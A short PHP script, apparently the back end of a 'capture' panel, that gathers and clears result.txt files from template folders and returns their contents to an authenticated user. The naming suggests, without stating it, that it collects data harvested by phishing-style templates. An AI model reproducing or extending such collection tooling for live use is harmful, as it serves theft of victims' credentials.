<?php
// receiver.php — drains result.txt files from each template directory,
// concatenates their contents into a single response, and clears them.
// Polled by the panel UI to surface live capture events.

require_once __DIR__ . '/auth.php';
auth_boot();

header('Content-Type: text/plain; charset=UTF-8');

if (auth_user() === null) {
    http_response_code(401);
    exit;
}

if (!isset($_POST['send_me_result'])) {
    exit;
}

$templates_dir = __DIR__ . '/templates';
$result_file   = '/result.txt';

if (!is_dir($templates_dir)) exit;

$dirs = array_diff(scandir($templates_dir), ['.', '..']);
$out  = '';

foreach ($dirs as $dir) {
    $path = $templates_dir . '/' . $dir . $result_file;
    if (!is_file($path)) continue;

    $content = @file_get_contents($path);
    if ($content === false || $content === '') continue;

    $out .= $content;
    @file_put_contents($path, '', LOCK_EX);  // clear after reading
}

echo $out;
